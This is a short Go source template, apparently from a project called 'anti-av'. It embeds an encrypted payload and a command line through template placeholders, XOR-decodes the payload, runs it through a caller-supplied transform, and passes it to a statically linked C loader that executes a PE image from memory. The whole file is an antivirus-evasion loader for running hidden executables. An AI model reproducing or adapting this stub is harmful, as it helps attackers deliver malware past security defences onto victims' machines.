package pe

// #cgo CFLAGS: -I${SRCDIR}/pe
// #cgo LDFLAGS: -L${SRCDIR} -lpe -lstdc++ --static
// #include "loader.h"
import "C"

import (
	"unsafe"

	"github.com/b1gcat/anti-av/utils"
)

var (
	Code = []byte{ {{.CODE}} }
	CmdLine = []byte{ {{.CMDLINE}} }
)

func Hi(p func([]byte) ([]byte, error)) error {
	var err error

	kek := utils.Kek(Code[4:])
	for k := range kek {
		Code[k] ^= kek[k]
	}

	if Code, err = p(Code); err != nil {
		return err
	}
	if len(CmdLine) != 0 {
		C.pe((*C.uchar)(unsafe.Pointer(&Code[0])),(*C.char)(unsafe.Pointer(&CmdLine[0])))
	} else  {
		C.pe((*C.uchar)(unsafe.Pointer(&Code[0])),nil)
	}
	return nil
}
